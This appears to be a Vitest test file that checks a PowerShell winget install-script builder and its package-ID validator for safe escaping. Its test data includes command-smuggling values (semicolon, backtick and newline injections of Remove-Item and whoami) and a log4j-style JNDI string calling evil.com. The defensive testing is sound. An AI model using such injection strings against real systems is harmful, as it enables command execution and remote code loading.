import { describe, it, expect } from 'vitest'
import { buildInstallScript } from '../scriptBuilder'
import { validatePackageIds } from '../packageValidator'

/**
 * SECURITY INTEGRATION TESTS
 *
 * These tests verify that security measures work correctly
 * even when the internal functions are not exported.
 */
describe('Security Integration', () => {
  describe('PowerShell Script Generation Security', () => {
    it('should safely handle package IDs with semicolons (command separator)', () => {
      const script = buildInstallScript(['Git;Remove-Item'], [])

      // The script should NOT execute the malicious part
      // Package ID should be quoted/escaped in the script
      expect(script).toMatch(/"Git;Remove-Item"/)
    })

    it('should safely handle package IDs with dollar signs (variable interpolation)', () => {
      const script = buildInstallScript(['$PATH'], [])

      // Dollar signs should be escaped
      expect(script).toContain('`$')
    })

    it('should safely handle package IDs with backticks (command substitution)', () => {
      const script = buildInstallScript(['Git`whoami'], [])

      // Backticks should be escaped
      expect(script).toContain('``')
    })

    it('should safely handle package IDs with quotes (string breakout)', () => {
      const script = buildInstallScript(['Git"'], [])
      const script2 = buildInstallScript(["Git'"], [])

      // Quotes should be escaped
      expect(script).toContain('`"')
      expect(script2).toContain("''")
    })

    it('should generate valid PowerShell that quotes package IDs', () => {
      const script = buildInstallScript(['Git.Git'], [])

      // Package IDs should be quoted in the array
      expect(script).toMatch(/"\s*Git\.Git\s*"/)
    })

    it('should handle real-world winget ID formats safely', () => {
      const realIds = [
        'Microsoft.VisualStudioCode',
        'Google.Chrome',
        'VideoLAN.VLC',
        '7zip.7zip',
        'Python.Python.3.12',
      ]

      const script = buildInstallScript(realIds, [])

      // All IDs should be present and quoted
      realIds.forEach(id => {
        expect(script).toContain(id)
      })
    })

    it('should include proper error handling in generated script', () => {
      const script = buildInstallScript(['Git.Git'], [])

      expect(script).toContain('$ErrorActionPreference')
      expect(script).toContain('try {')
      expect(script).toContain('catch')
    })

    it('should use --exact flag to prevent partial match attacks', () => {
      const script = buildInstallScript(['Git.Git'], [])

      // The --exact flag prevents installing similar packages
      expect(script).toContain('--exact')
    })

    it('should include retry logic for failed installations', () => {
      const script = buildInstallScript(['Git.Git'], [])

      // Should have retry mechanism
      expect(script).toContain('$attempt')
      expect(script).toContain('RETRY')
    })
  })

  describe('Package Input Validation Security', () => {
    const catalogIds = ['Git.Git', 'Google.Chrome', 'Microsoft.VisualStudioCode']

    it('should enforce MAX_IDS limit (50 packages)', () => {
      const tooManyIds = Array.from({ length: 100 }, (_, i) => `Package${i}.App`)
      const result = validatePackageIds(tooManyIds, catalogIds)

      // Should only process first 50
      expect(result.valid.length + result.invalid.length).toBeLessThanOrEqual(50)
    })

    it('should enforce MAX_ID_LENGTH (100 characters)', () => {
      const tooLongId = 'A'.repeat(101)
      const result = validatePackageIds([tooLongId], catalogIds)

      // Should reject or truncate
      expect(result.valid).not.toContain(tooLongId)
    })

    it('should accept ID at exactly 100 characters', () => {
      // Winget IDs must have format: Publisher.App
      // Create a valid ID at exactly 100 characters: 49 + dot + 50 = 100
      const publisherPart = 'A'.repeat(49)
      const appPart = 'B'.repeat(50)
      const maxLengthId = `${publisherPart}.${appPart}`
      const catalog = [maxLengthId]
      const result = validatePackageIds([maxLengthId], catalog)

      expect(result.valid).toContain(maxLengthId)
    })

    it('should remove duplicate package IDs', () => {
      const result = validatePackageIds(
        ['Git.Git', 'Git.Git', 'Git.Git', 'Google.Chrome', 'Git.Git'],
        catalogIds
      )

      // Should only have one Git.Git
      const gitCount = result.valid.filter(id => id === 'Git.Git').length
      expect(gitCount).toBe(1)
    })

    it('should separate valid from invalid package IDs', () => {
      const result = validatePackageIds(
        ['Git.Git', 'Fake.Package', 'Google.Chrome', 'Nonexistent.App'],
        catalogIds
      )

      expect(result.valid).toEqual(['Git.Git', 'Google.Chrome'])
      expect(result.invalid).toEqual(['Fake.Package', 'Nonexistent.App'])
    })

    it('should validate ID format (Publisher.App pattern)', () => {
      const invalidFormats = [
        'single',
        '.starts.with.dot',
        'ends.with.dot.',
        'has space.Bad',
        'has@symbol.Bad',
        'has' + '\x00' + 'nullbyte',
      ]

      const catalog: string[] = []
      const result = validatePackageIds(invalidFormats, catalog)

      // All should be rejected
      expect(result.valid).toHaveLength(0)
    })

    it('should accept valid winget ID formats', () => {
      const validFormats = [
        'A.B',
        'Publisher1.App2',
        'my-app.my-app',
        'my_app.my_app',
        'My.Pub.App',
        'Microsoft.VisualStudioCode',
        '7zip.7zip',
      ]

      const catalog = validFormats
      const result = validatePackageIds(validFormats, catalog)

      // All should be accepted
      expect(result.valid).toEqual(validFormats)
    })
  })

  describe('Real-World Attack Scenarios', () => {
    it('should prevent log4j-style injection attempts', () => {
      const log4j = '${jndi:ldap://evil.com/a}'
      const script = buildInstallScript([log4j], [])

      // The ${} syntax should be escaped or not executed
      expect(script).toContain('`$')
    })

    it('should prevent pipe injection', () => {
      const pipeInjection = 'Git | Format-Table'
      const script = buildInstallScript([pipeInjection], [])

      // The pipe character should be preserved but quoted (not executed as PowerShell)
      expect(script).toContain('|')
    })

    it('should prevent newline command injection', () => {
      const newlineInjection = 'Git\nRemove-Item'
      const script = buildInstallScript([newlineInjection], [])

      // The newline should be preserved but quoted (not executed)
      expect(script).toContain('\n')
    })

    it('should prevent carriage return injection', () => {
      const crInjection = 'Git\rRemove-Item'
      const script = buildInstallScript([crInjection], [])

      // The CR should be preserved but quoted
      expect(script).toContain('\r')
    })

    it('should handle tab injection safely', () => {
      const tabInjection = 'Git\tRemove-Item'
      const script = buildInstallScript([tabInjection], [])

      // The tab should be preserved but quoted
      expect(script).toContain('\t')
    })

    it('should prevent null byte injection', () => {
      const nullInjection = 'Git\x00.Git'
      const result = validatePackageIds([nullInjection], ['Git.Git'])

      // Should handle null bytes safely (no crash)
      expect(result.valid.length + result.invalid.length).toBe(1)
    })
  })

  describe('Generated Script Safety', () => {
    it('should use proper array syntax for packages', () => {
      const script = buildInstallScript(['Git.Git', 'Chrome'], [])

      // Should use PowerShell array syntax
      expect(script).toContain('$packages = @(')
      expect(script).toContain(')')
    })

    it('should include winget installation check', () => {
      const script = buildInstallScript(['Git.Git'], [])

      expect(script).toContain('Test-WingetInstalled')
      expect(script).toContain('Install-WingetIfMissing')
    })

    it('should use --silent flag for unattended installation', () => {
      const script = buildInstallScript(['Git.Git'], [])

      expect(script).toContain('--silent')
      expect(script).toContain('--disable-interactivity')
    })

    it('should include installation summary', () => {
      const script = buildInstallScript(['Git.Git'], [])

      expect(script).toContain('Installed')
      expect(script).toContain('Skipped')
      expect(script).toContain('Failed')
    })

    it('should provide retry command for failed packages', () => {
      const script = buildInstallScript(['Git.Git'], [])

      expect(script).toContain('Retry failed:')
      expect(script).toContain('powershell -c')
    })
  })
})
